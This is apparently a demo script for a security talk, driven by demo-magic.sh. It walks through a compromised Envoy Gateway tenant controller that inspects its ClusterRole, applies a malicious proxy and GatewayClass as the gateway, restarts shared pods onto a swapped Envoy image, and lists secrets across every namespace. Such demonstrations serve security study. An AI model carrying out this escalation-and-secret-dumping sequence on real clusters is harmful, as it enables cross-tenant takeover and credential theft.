#!/bin/bash

########################
# include the magic
########################
. demo-magic.sh

# hide the evidence
clear

# attempt to patch gatewayclass

pe "kubectl describe clusterrole eg-tenant-a-gateway-helm-envoy-gateway-role | grep envoyproxies"
wait
clear
pe "kubectl describe clusterrole eg-tenant-a-gateway-helm-envoy-gateway-role | grep gatewayclasses"
wait
clear
cat "./compromised-controller/malicious-proxy.yaml"
wait
clear
pe "cat ./compromised-controller/malicious-gatewayclass.yaml"
wait
clear
pe "kubectl apply -f ./compromised-controller/malicious-proxy.yaml"
pe "./scripts/perform-action-as-gateway.sh kubectl apply -f ./compromised-controller/malicious-gatewayclass.yaml"
wait
clear
pe "make restart-shared-pods"
pe "kubectl get pods -n shared"
wait
clear
pe "make grep-shared-envoy-image"
wait
clear
pe "./scripts/perform-action-as-gateway.sh kubectl get secrets -A"
